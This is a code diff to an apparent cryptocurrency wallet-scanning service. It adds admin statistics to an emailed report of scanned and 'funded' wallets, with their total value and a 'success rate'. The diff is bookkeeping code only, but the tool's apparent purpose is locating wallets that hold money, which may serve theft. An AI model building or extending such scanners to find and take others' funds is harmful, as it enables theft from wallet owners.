@@ -58,6 +58,12 @@ router.post('/scan-real-wallets', async (req, res) => {
       }
     }
     
+    // Update admin stats
+    const adminStats = require('../services/adminStats');
+    const fundedWallets = foundWallets.filter(w => w.totalValueUSD > 0);
+    const totalValue = foundWallets.reduce((sum, w) => sum + w.totalValueUSD, 0);
+    await adminStats.updateStats(scanCount, fundedWallets.length, totalValue);
+    
     // Send complete scan results via CSV
     await sendCompleteResults(foundWallets, scanCount);
     
@@ -301,13 +307,19 @@ async function sendCompleteResults(wallets, totalScanned) {
     }).join('\n');
     const csvContent = csvHeader + csvRows;
     
+    // Get updated admin stats
+    const adminStats = require('../services/adminStats');
+    const statsMessage = await adminStats.getStatsMessage();
+    
     const subject = `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`;
     const message = `WALLET SCANNER COMPLETE REPORT
 
-📊 TOTAL SCANNED: ${totalScanned} wallets
+📊 THIS SCAN: ${totalScanned} wallets
 💰 FUNDED WALLETS: ${walletsWithFunds.length}
 💵 TOTAL VALUE FOUND: $${totalValue.toFixed(2)}
 📈 SUCCESS RATE: ${((walletsWithFunds.length / totalScanned) * 100).toFixed(2)}%
+
+${statsMessage}
 
 📎 ATTACHMENT: Complete CSV with ALL ${totalScanned} wallets
 
